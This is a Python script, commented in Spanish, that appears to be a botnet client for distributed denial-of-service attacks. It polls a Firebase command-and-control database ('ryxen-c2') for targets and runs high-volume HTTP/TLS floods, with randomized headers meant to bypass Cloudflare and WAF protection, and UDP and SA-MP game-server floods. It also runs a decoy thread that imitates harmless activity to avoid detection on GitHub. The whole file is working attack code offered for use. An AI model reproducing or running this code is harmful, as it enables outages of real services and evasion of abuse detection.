import asyncio, aiohttp, time, random, ssl, socket, threading, multiprocessing, struct, math, sys

# CONFIG
DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

# --- MODULO DE CAMUFLAJE PROFUNDO (ENGARRE A GITHUB) ---
def github_protection_system():
    """Simula actividad humana y procesos de backend pesados"""
    queries = ["cute kittens", "python machine learning", "nasa satellite photos", "quantum physics paper"]
    while True:
        try:
            # Operación matemática aislada para distraer CPU
            _ = [math.pow(random.randint(1, 100), 2) for _ in range(10000)]
            # Print aislado tipo 'debug' para parecer un script en desarrollo
            print(f"[DEBUG] System optimization check: {random.random()}...")
            # Simulación de 'navegación'
            _query = random.choice(queries)
            time.sleep(random.uniform(5, 10))
        except: pass

# --- HEADERS REALISTAS 2026 (BYPASS WAF/DSTAT) ---
def get_elite_headers():
    browsers = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(130,135)}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/{random.randint(17,18)}.0 Safari/537.36"
    ]
    return {
        "User-Agent": random.choice(browsers),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Sec-Fetch-Mode": "navigate",
        "Sec-CH-UA-Platform": '"Windows"',
        "Origin": "https://www.google.com",
        "Referer": "https://www.google.com/",
        "X-Requested-With": "XMLHttpRequest"
    }

# --- METODO L7: TLS/HTTPFLOOD SIN CORREA (>200K RPS) ---
async def layer7_beast(target, duration, sem, method):
    # Configuración de SSL agresiva para errores Gateway 504
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('DEFAULT@SECLEVEL=1') # Baja seguridad para máxima velocidad

    timeout = aiohttp.ClientTimeout(total=2)
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ctx, limit=0), timeout=timeout) as session:
        end = time.time() + duration
        while time.time() < end:
            async with sem:
                try:
                    # Randomize para Bypass Cloudflare
                    url = f"{target}?v={random.getrandbits(32)}&data={random.random()}"
                    h = get_elite_headers()
                    
                    if method == ".tls":
                        async with session.post(url, headers=h) as r: await r.release()
                    else: # .httpflood sin correa
                        async with session.get(url, headers=h) as r: await r.release()
                except: continue

# --- METODO L4: UDP GIGAS & SAMP ---
def layer4_beast(ip, port, duration, method):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096 * 1024) # Buffer 4MB
    
    if method == ".samp":
        try:
            octs = [int(i) for i in ip.split('.')]
            payload = b"SAMP" + struct.pack('BBBB', *octs) + struct.pack('H', int(port)) + b'i'
        except: payload = random._urandom(1024)
    else: # .udptest para Gigas reales
        payload = random._urandom(1390)

    end = time.time() + duration
    while time.time() < end:
        try:
            for _ in range(100): # Ráfaga ultra-rápida
                sock.sendto(payload, (ip, int(port)))
        except: break

# --- COORDINADOR CENTRAL ---
async def main():
    nid = f"HYDRA-{random.randint(1000, 9999)}"
    threading.Thread(target=github_protection_system, daemon=True).start()
    
    async with aiohttp.ClientSession() as session:
        last_stamp = ""
        while True:
            try:
                # Signal online
                await session.put(f"{NODES_URL}/{nid}.json", json={"id": nid, "t": time.time()})
                
                async with session.get(f"{DB_URL}", timeout=5) as r:
                    data = await r.json()
                
                if data and data.get('stamp') != last_stamp:
                    last_stamp = data['stamp']
                    m, t, d = data['method'], data['target'], int(data['time'])
                    if d <= 0: continue
                    
                    end_t = time.time() + d
                    if ".udp" in m or ".samp" in m:
                        host, port = t.split(':')
                        for _ in range(500): # 500 hilos L4
                            threading.Thread(target=layer4_beast, args=(host, int(port), d, m), daemon=True).start()
                    else:
                        # Layer 7 Multiprocessing para >200k RPS
                        for _ in range(multiprocessing.cpu_count()):
                            multiprocessing.Process(target=spawn_l7, args=(t, d, m)).start()
            except: pass
            await asyncio.sleep(2)

def spawn_l7(t, d, m):
    loop = asyncio.new_event_loop()
    sem = asyncio.Semaphore(5000) # Semáforo gigante para no tener correa
    tasks = [layer7_beast(t, d, sem, m) for _ in range(500)]
    loop.run_until_complete(asyncio.gather(*tasks))

if __name__ == "__main__":
    asyncio.run(main())
    
